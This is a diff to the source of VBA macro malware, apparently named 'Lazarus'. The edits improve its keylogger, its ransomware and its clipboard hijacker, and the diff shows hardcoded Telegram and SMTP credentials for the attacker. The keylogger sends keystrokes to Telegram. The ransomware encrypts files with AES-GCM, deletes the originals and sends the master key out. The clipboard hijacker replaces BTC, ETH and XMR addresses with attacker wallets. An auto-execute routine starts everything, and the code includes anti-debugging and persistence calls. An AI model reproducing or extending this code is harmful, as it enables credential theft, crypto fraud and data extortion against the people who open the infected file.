@@ -13,7 +13,7 @@ Private Const WH_KEYBOARD_LL As Long = 13
 Private Const WM_KEYDOWN As Long = &H100
 
 ' ========================
-' ATTACKER CREDENTIALS (CHANGE THESE)
+' ATTACKER CREDENTIALS
 ' ========================
 Private Const TELEGRAM_BOT_TOKEN As String = "7283940156:AAEjK8LmN9pQrS7tUvWxYz1B2C3D4E5F6G"
 Private Const TELEGRAM_CHAT_ID As String = "5010121"
@@ -90,6 +90,7 @@ Private Const SMTP_PASSWORD As String = "@apple12345"
     Private Declare PtrSafe Function IsDebuggerPresent Lib "kernel32" () As Long
     Private Declare PtrSafe Function CheckRemoteDebuggerPresent Lib "kernel32" (ByVal hProcess As LongPtr, ByRef pbDebuggerPresent As Long) As Long
     Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
+    Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
 #End If
 
 ' ========================
@@ -218,7 +219,8 @@ End Type
 ' ========================
 Private gMasterKey(31) As Byte
 Private gKeySet As Boolean
-Private gKeyloggerHook As LongPtr
+Private gKeyloggerRunning As Boolean
+Private gClipboardRunning As Boolean
 Private gKeylogBuffer As String
 Private gRunFlag As String
 Private gStateLoaded As Boolean
@@ -229,50 +231,42 @@ Private gWinBuild As Long
 Private gFirstRun As Boolean
 
 ' ========================
-' KEYLOGGER CALLBACK (MUST BE IN STANDARD MODULE – PLACE IN MODULE, NOT CLASS)
+' KEYLOGGER (POLLING WITH OnTime – NON‑BLOCKING)
 ' ========================
-' NOTE: The keylogger callback function must be in a standard .bas module.
-' For ThisWorkbook, we cannot use AddressOf. So we'll implement a polling keylogger instead.
-' Below is a polling keylogger that runs in a loop and reads keystate.
-' This is simpler and works within VBA limitations.
-
-Private Declare PtrSafe Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
-
 Sub PollingKeylogger()
+    If gKeyloggerRunning Then Exit Sub
+    gKeyloggerRunning = True
     On Error Resume Next
-    Dim lastKeys(256) As Integer
-    Dim i As Long, key As Long
+    
+    Dim i As Long, key As Long, state As Integer
     Dim keyName As String, logFile As String
     logFile = GetTempDir() & "keylog.txt"
-    Do While True
-        For key = 1 To 254
-            Dim state As Integer: state = GetAsyncKeyState(key)
-            If state And &H8000 Then
-                If lastKeys(key) = 0 Then
-                    lastKeys(key) = 1
-                    keyName = GetKeyName(key)
-                    If keyName <> "" Then
-                        gKeylogBuffer = gKeylogBuffer & keyName
-                        If Len(gKeylogBuffer) > 1000 Then
-                            Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-                            Dim ts As Object: Set ts = fso.OpenTextFile(logFile, 8, True)
-                            ts.Write gKeylogBuffer
-                            ts.Close
-                            SendToTelegramChunked "KEYLOG|" & gKeylogBuffer
-                            gKeylogBuffer = ""
-                        End If
-                    End If
+    
+    ' Scan all virtual keys
+    For key = 8 To 255
+        state = GetAsyncKeyState(key)
+        If state And &H8000 Then
+            keyName = GetKeyNameFromVK(key)
+            If keyName <> "" Then
+                gKeylogBuffer = gKeylogBuffer & keyName
+                If Len(gKeylogBuffer) > 1000 Then
+                    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+                    Dim ts As Object: Set ts = fso.OpenTextFile(logFile, 8, True)
+                    ts.Write gKeylogBuffer
+                    ts.Close
+                    SendToTelegramChunked "KEYLOG|" & gKeylogBuffer
+                    gKeylogBuffer = ""
                 End If
-            Else
-                lastKeys(key) = 0
             End If
-        Next
-        DoEvents
-        Sleep 10
-    Loop
+        End If
+    Next key
+    
+    gKeyloggerRunning = False
+    ' Schedule next run in 100ms
+    Application.OnTime Now + TimeValue("00:00:00.1"), "PollingKeylogger"
 End Sub
 
-Function GetKeyName(vKey As Long) As String
+Function GetKeyNameFromVK(vKey As Long) As String
     On Error Resume Next
     Dim ret As String
     Select Case vKey
@@ -291,8 +285,10 @@ Function GetKeyName(vKey As Long) As String
             If GetAsyncKeyState(16) And &H8000 Then ret = Chr(vKey) Else ret = LCase(Chr(vKey))
         Case Else: ret = ""
     End Select
-    GetKeyName = ret
+    GetKeyNameFromVK = ret
 End Function
+
+Private Declare PtrSafe Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
 
 ' ========================
 ' UTILITIES
@@ -736,20 +732,19 @@ Sub GenerateMasterKey()
         gKeySet = True
     End If
     ' Exfiltrate master key to Telegram
-    Dim keyHex As String
+    Dim keyHex As String, i As Long
     For i = 0 To 31: keyHex = keyHex & Right("0" & Hex(gMasterKey(i)), 2): Next
     SendToTelegram "RANSOM_MASTER_KEY|" & keyHex & "|" & GetMachineID()
 End Sub
 
-Function AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte) As Byte()
+' Encrypts data and returns ciphertext and tag (both as Byte arrays)
+Sub AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte, ByRef cipher() As Byte, ByRef tag() As Byte)
     On Error GoTo Fail
     Dim hAlg As LongPtr, hKey As LongPtr
     Dim status As Long
     Dim algName As String: algName = "AES-GCM"
     status = BCryptOpenAlgorithmProvider(hAlg, StrPtr(algName), 0, 0)
     If status <> 0 Then GoTo Fail
-    status = BCryptSetProperty(hAlg, StrPtr("ChainingMode"), StrPtr("ChainingModeGCM"), 16, 0)
-    If status <> 0 Then GoTo Cleanup
     Dim keyObjSz As Long: keyObjSz = 1024
     Dim keyObj() As Byte: ReDim keyObj(keyObjSz - 1)
     status = BCryptGenerateSymmetricKey(hAlg, hKey, VarPtr(keyObj(0)), keyObjSz, VarPtr(key(0)), UBound(key) + 1, 0)
@@ -761,7 +756,7 @@ Function AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte) As Byte(
     authInfo.cbNonce = 12
     authInfo.pbAuthData = 0
     authInfo.cbAuthData = 0
-    Dim tag(15) As Byte
+    ReDim tag(15) As Byte
     authInfo.pbTag = VarPtr(tag(0))
     authInfo.cbTag = 16
     authInfo.pbMacContext = 0
@@ -774,16 +769,14 @@ Function AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte) As Byte(
     If status <> 0 Then GoTo Cleanup
     ReDim cipher(encryptedSize - 1) As Byte
     status = BCryptEncrypt(hKey, VarPtr(plain(0)), UBound(plain) + 1, VarPtr(authInfo), 0, 0, VarPtr(cipher(0)), encryptedSize, encryptedSize, 0)
-    If status = 0 Then
-        AESGCMEncrypt = cipher
-        GoTo Cleanup
-    End If
+    If status = 0 Then Exit Sub
 Fail:
-    ReDim AESGCMEncrypt(0): AESGCMEncrypt(0) = 0
+    ReDim cipher(0): cipher(0) = 0
+    ReDim tag(0): tag(0) = 0
 Cleanup:
     If hKey <> 0 Then BCryptDestroyKey hKey
     If hAlg <> 0 Then BCryptCloseAlgorithmProvider hAlg, 0
-End Function
+End Sub
 
 Sub WriteFileBytes(filePath As String, data() As Byte)
     On Error Resume Next
@@ -801,16 +794,21 @@ Sub EncryptFile(path As String)
     Dim nonce(11) As Byte, i As Long
     Randomize Timer
     For i = 0 To 11: nonce(i) = CByte(Rnd * 255): Next
-    Dim cipher() As Byte: cipher = AESGCMEncrypt(data, gMasterKey, nonce)
-    If UBound(cipher) < 0 Then Exit Sub
-    Dim newPath As String: newPath = path & ".lzr"
-    WriteFileBytes newPath, cipher
-    If fso.FileExists(newPath) Then
-        fso.DeleteFile path
-        ' Save nonce and tag for decryption (optional)
-        Dim keyPath As String: keyPath = path & ".lzr.key"
-        WriteFileBytes keyPath, nonce
-        WriteFileBytes keyPath, tag
+    Dim cipher() As Byte, tag() As Byte
+    AESGCMEncrypt data, gMasterKey, nonce, cipher, tag
+    If UBound(cipher) < 0 Or UBound(tag) < 0 Then Exit Sub
+    ' Save encrypted file
+    Dim encPath As String: encPath = path & ".lzr"
+    WriteFileBytes encPath, cipher
+    ' Save nonce + tag for decryption
+    Dim keyPath As String: keyPath = path & ".lzr.key"
+    Dim keyData() As Byte: ReDim keyData(11 + 16 - 1)
+    For i = 0 To 11: keyData(i) = nonce(i): Next
+    For i = 0 To 15: keyData(12 + i) = tag(i): Next
+    WriteFileBytes keyPath, keyData
+    If fso.FileExists(encPath) Then
+        SetAttr path, 0
+        Kill path
     End If
 End Sub
 
@@ -846,44 +844,45 @@ Sub RunRansomware()
 End Sub
 
 ' ========================
-' CLIPBOARD HIJACK
+' CLIPBOARD HIJACK (NON‑BLOCKING)
 ' ========================
 Sub ClipboardMonitorLoop()
+    If gClipboardRunning Then Exit Sub
+    gClipboardRunning = True
     On Error Resume Next
     Dim lastText As String
-    Do
-        Dim text As String
-        If OpenClipboard(0) Then
-            Dim hData As LongPtr: hData = GetClipboardData(1)
-            If hData Then
-                Dim pText As LongPtr: pText = GlobalLock(hData)
-                If pText Then
-                    Dim lenText As Long: lenText = lstrlen(pText)
-                    If lenText > 0 And lenText < 1024 Then
-                        Dim buf As String: buf = Space(lenText)
-                        CopyMemory ByVal buf, ByVal pText, lenText
-                        text = buf
-                        GlobalUnlock hData
-                    End If
+    Dim text As String
+    If OpenClipboard(0) Then
+        Dim hData As LongPtr: hData = GetClipboardData(1)
+        If hData Then
+            Dim pText As LongPtr: pText = GlobalLock(hData)
+            If pText Then
+                Dim lenText As Long: lenText = lstrlen(pText)
+                If lenText > 0 And lenText < 1024 Then
+                    Dim buf As String: buf = Space(lenText)
+                    CopyMemory ByVal buf, ByVal pText, lenText
+                    text = buf
+                    GlobalUnlock hData
                 End If
             End If
-            CloseClipboard
         End If
-        If text <> "" And text <> lastText Then
-            lastText = text
-            If (Len(text) = 34 And (Left(text, 1) = "1" Or Left(text, 1) = "3")) Or (Len(text) = 42 And Left(text, 3) = "bc1") Then
-                SetClipboardContent BTC_WALLET
-                SendToTelegram "CLIPBOARD_SWAP|BTC|" & Left(text, 8) & "..."
-            ElseIf Len(text) = 42 And Left(text, 2) = "0x" Then
-                SetClipboardContent ETH_WALLET
-                SendToTelegram "CLIPBOARD_SWAP|ETH|" & Left(text, 8) & "..."
-            ElseIf Len(text) = 95 And Left(text, 1) = "4" Then
-                SetClipboardContent XMR_WALLET
-                SendToTelegram "CLIPBOARD_SWAP|XMR|" & Left(text, 8) & "..."
-            End If
+        CloseClipboard
+    End If
+    If text <> "" And text <> lastText Then
+        lastText = text
+        If (Len(text) = 34 And (Left(text, 1) = "1" Or Left(text, 1) = "3")) Or (Len(text) = 42 And Left(text, 3) = "bc1") Then
+            SetClipboardContent BTC_WALLET
+            SendToTelegram "CLIPBOARD_SWAP|BTC|" & Left(text, 8) & "..."
+        ElseIf Len(text) = 42 And Left(text, 2) = "0x" Then
+            SetClipboardContent ETH_WALLET
+            SendToTelegram "CLIPBOARD_SWAP|ETH|" & Left(text, 8) & "..."
+        ElseIf Len(text) = 95 And Left(text, 1) = "4" Then
+            SetClipboardContent XMR_WALLET
+            SendToTelegram "CLIPBOARD_SWAP|XMR|" & Left(text, 8) & "..."
         End If
-        StealthSleep 500
-    Loop
+    End If
+    gClipboardRunning = False
+    Application.OnTime Now + TimeValue("00:00:00.5"), "ClipboardMonitorLoop"
 End Sub
 
 Sub SetClipboardContent(txt As String)
@@ -1128,7 +1127,7 @@ Sub AutoExec()
     GenerateMasterKey
     SendToTelegram "LAZARUS_START|" & GetMachineID()
     
-    ' Start polling keylogger in background (using OnTime to avoid freezing)
+    ' Start polling keylogger (non‑blocking)
     Application.OnTime Now + TimeValue("00:00:01"), "PollingKeylogger"
     
     If IsDomainController() Then
@@ -1144,7 +1143,7 @@ Sub AutoExec()
         PersistAll
         RunRansomware
         DeploySocialEngineeringUI
-        ' Start clipboard monitor in background
+        ' Start clipboard monitor (non‑blocking)
         Application.OnTime Now + TimeValue("00:00:01"), "ClipboardMonitorLoop"
     End If
     
